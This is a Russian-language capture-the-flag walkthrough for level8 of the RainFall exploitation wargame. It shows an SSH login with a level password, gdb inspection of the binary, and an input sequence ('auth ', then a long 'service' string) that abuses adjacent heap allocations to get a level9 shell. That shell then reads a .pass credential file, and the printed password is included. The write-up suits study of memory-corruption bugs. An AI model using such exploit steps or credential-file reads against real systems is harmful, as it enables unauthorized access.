### level8
0. Заходим под пользователем: `ssh level8@172.16.188.131 -p 4242` / `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`

1. Запускаем бинарник `level8`

```
level8@RainFall:~$ ./level8
(nil), (nil)
asd
(nil), (nil)
qwe
(nil), (nil)
zxc
(nil), (nil)
ntrth
(nil), (nil)
dfgashdgbkqjwbviqvwkl
(nil), (nil)
whoami
(nil), (nil)
```

2. Идем в `gdb` смотрим на функции и переменные:

```
пока ничего не понятно, идём в gdb
(gdb)  i func
0x08048564  main

(gdb) i var
0x08049aac  auth
0x08049ab0  service
```

Заметим что переменные `auth` и `service` расположены очень близко в памяти разница в 4 байта

3. Делайем дизас `disas main` и [восстанавиваем программу](https://disk.yandex.ru/i/-ZEMgS9t41oElw)
4. Видим что есть сравнение  `auth[32]`, но для него у нас же зарезервировано всего 4 байта! Ну чтоже значит `auth[32]` - это кусок из переменной service, ну заполним service большой строкой!

5. Прохождение (**важно!!!** ввести `auth ` с пробелом):

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
servicXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
